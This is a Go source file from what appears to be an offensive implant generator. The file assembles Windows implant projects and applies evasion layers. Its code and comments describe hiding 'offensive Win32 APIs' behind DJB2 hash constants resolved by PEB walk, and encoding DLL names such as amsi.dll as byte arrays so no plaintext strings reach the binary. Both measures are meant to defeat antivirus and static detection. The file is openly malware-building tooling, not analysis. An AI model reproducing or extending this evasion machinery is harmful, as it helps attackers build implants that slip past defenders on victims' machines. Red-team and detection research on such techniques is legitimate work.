// Package payload assembles the emitted Go implant: it renders main.go from a
// technique + active evasion layers, computes DJB2 hash constants, and writes a
// buildable Go project (main.go, go.mod, go.sum, build.sh, README.md) that
// cross-compiles to a Windows PE via github.com/carved4/go-wincall.
//
// OPSEC design (verified against go-wincall v1.3.2):
//
//   - Every offensive Win32 API is resolved at runtime by a PEB walk + DJB2
//     hash (wincall.GetModuleBase / GetFunctionAddress / CallG0). API names
//     appear ONLY in source-level comments, which the Go compiler strips —
//     they never reach the binary. The implant's IAT therefore contains only
//     the unavoidable Go-runtime baseline (GetProcAddress, LoadLibraryExW,
//     VirtualAlloc, CreateThread), shared by every Go Windows binary.
//   - Runtime DLL names that are not already loaded (amsi.dll, the stomp
//     target DLL) are reconstructed from numeric byte arrays so no plaintext
//     DLL-name string literal is present in the binary.
//   - kernel32.dll / ntdll.dll are always loaded; found by hash via the PEB
//     walk, so their names are never referenced.
//
// The generator compiles the implant; it never executes it.
package payload

import (
	"fmt"
	"sort"
	"strings"

	"shroud/internal/winhash"
)

// Builder renders the implant source for a Spec, tracking which APIs the
// fragments reference so the hash-constant block covers exactly what is used.
type Builder struct {
	Spec    *Spec
	funcs   map[string]uint32 // goConstName -> DJB2 hash  (e.g. "hVirtualAlloc")
	modules map[string]uint32 // goConstName -> DJB2 hash  (e.g. "hKernel32Dll")
	// order preserves deterministic emission.
	funcOrder   []string
	moduleOrder []string
}

func newBuilder(s *Spec) *Builder {
	return &Builder{
		Spec:    s,
		funcs:   map[string]uint32{},
		modules: map[string]uint32{},
	}
}

// api registers that the implant references funcName in moduleName and returns
// the Go const names to use at call sites: (moduleConst, funcConst). Repeated
// calls with the same names return the same consts (deduped).
func (b *Builder) api(moduleName, funcName string) (modConst, fnConst string) {
	mc := "h" + ident(moduleName)
	if _, ok := b.modules[mc]; !ok {
		b.modules[mc] = winhash.Hash(moduleName)
		b.moduleOrder = append(b.moduleOrder, mc)
	}
	fc := "h" + ident(funcName)
	if _, ok := b.funcs[fc]; !ok {
		b.funcs[fc] = winhash.Hash(funcName)
		b.funcOrder = append(b.funcOrder, fc)
	}
	return mc, fc
}

// ident turns a DLL/function name into a Go-identifier-safe suffix. e.g.
// "kernel32.dll" -> "Kernel32Dll", "NtAllocateVirtualMemory" stays.
func ident(name string) string {
	// split on non-alnum, Title-case each piece, concat
	var b strings.Builder
	up := true
	for _, r := range name {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
			if up {
				if r >= 'a' && r <= 'z' {
					r -= 32
				}
				up = false
			}
			b.WriteRune(r)
		default:
			up = true
		}
	}
	return b.String()
}

// emitConsts writes the hash-constant block. API names appear only in comments
// (stripped at compile); the binary holds only the numeric values.
func (b *Builder) emitConsts() string {
	var sb strings.Builder
	sb.WriteString("// Precomputed DJB2 (lowercase-folded) hash constants.\n")
	sb.WriteString("// Names appear only in these comments — the Go compiler strips comments, so no\n")
	sb.WriteString("// plaintext API/module-name string reaches the binary. Values were computed by\n")
	sb.WriteString("// the generator (internal/winhash) and match go-wincall's pkg/obf hash.\n")
	sb.WriteString("const (\n")
	mods := append([]string(nil), b.moduleOrder...)
	sort.Strings(mods)
	for _, c := range mods {
		sb.WriteString(fmt.Sprintf("\t%s = 0x%08x\n", c, b.modules[c]))
	}
	fns := append([]string(nil), b.funcOrder...)
	sort.Strings(fns)
	for _, c := range fns {
		sb.WriteString(fmt.Sprintf("\t%s = 0x%08x\n", c, b.funcs[c]))
	}
	sb.WriteString(")\n\n")
	return sb.String()
}

// hexLit formats a byte slice as a Go numeric byte-array initializer (no string
// literal — values are numeric so they do not form a plaintext string in rodata).
func hexLit(data []byte) string {
	var sb strings.Builder
	sb.WriteString("[]byte{")
	for i, x := range data {
		if i%16 == 0 {
			sb.WriteString("\n\t")
		}
		sb.WriteString(fmt.Sprintf("0x%02x, ", x))
	}
	sb.WriteString("\n}")
	return sb.String()
}